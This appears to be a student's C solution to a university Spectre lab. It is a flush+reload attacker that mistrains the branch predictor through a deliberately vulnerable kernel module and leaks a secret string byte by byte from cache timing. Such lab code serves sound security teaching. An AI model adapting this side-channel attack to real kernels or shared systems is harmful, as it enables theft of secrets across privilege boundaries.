/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"
#define CACHE_THRESHOLD 120
#define NUM_TRY 10
/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}
void flush(char *shared_memory)
{
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[SHD_SPECTRE_LAB_PAGE_SIZE * i]);
    }
}

void reload(char *shared_memory, int *scores)
{
    int junk=0;
    register uint64_t time1, time2;
    int offset = -1;
    for(int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++){
        uint64_t t = time_access(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
        if (t <= CACHE_THRESHOLD){
                // offset = i;
            scores[i]++;
        }
    } 
    // return offset;
}

uint64_t additional_computations() {
    uint64_t delay = 0;
    for (uint64_t i = 0; i < (1 << 30); i++) {
        delay += i;  // Dummy computation to introduce a delay
    }
    return delay % delay;
}
// int artificialLongLatencyOperation(size_t offset) {
//     // The operation could be memory accesses that are known to be slow,
//     // complex calculations, or anything that consumes time.
//     volatile int result = 0;
//     for (int i = 0; i < 1000000; ++i) {
//         result |= i + offset;
//     }
//     // Volatile is used to prevent the compiler from optimizing out the loop
//     return result % result; // Use result to prevent a warning about unused variable
// }
/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;
        int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES];
        for(int i =0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) scores[i] = 0;
        int max = 0;
        
        for(int j = 0; j < NUM_TRY; j++){
            flush(shared_memory);
            //train the CPU to take the branch inside the call_kernel
            for (int i = 0; i < 5; i++) {
                int train_offset = rand() % 4;
                call_kernel_part3(kernel_fd, shared_memory, rand() % 4);

            }
            if(current_offset > 3){
                clflush(&shared_memory[67 * SHD_SPECTRE_LAB_PAGE_SIZE]);
                clflush(&shared_memory[78 * SHD_SPECTRE_LAB_PAGE_SIZE]);
                clflush(&shared_memory[85 * SHD_SPECTRE_LAB_PAGE_SIZE]);
                clflush(&shared_memory[123 * SHD_SPECTRE_LAB_PAGE_SIZE]);
            }
            clflush(&current_offset);

            call_kernel_part3(kernel_fd, shared_memory, current_offset == current_offset ? current_offset + additional_computations() : 0 );

            reload(shared_memory, scores);
        }

        for(int i = 0; i< SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++){
            // if(scores[i] != 0) printf("%ld \tscore[%d] = %d \n", current_offset, i, scores[i]);
            if(scores[max] < scores[i]) max = i;
        }
        leaked_byte = (char)max;
        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
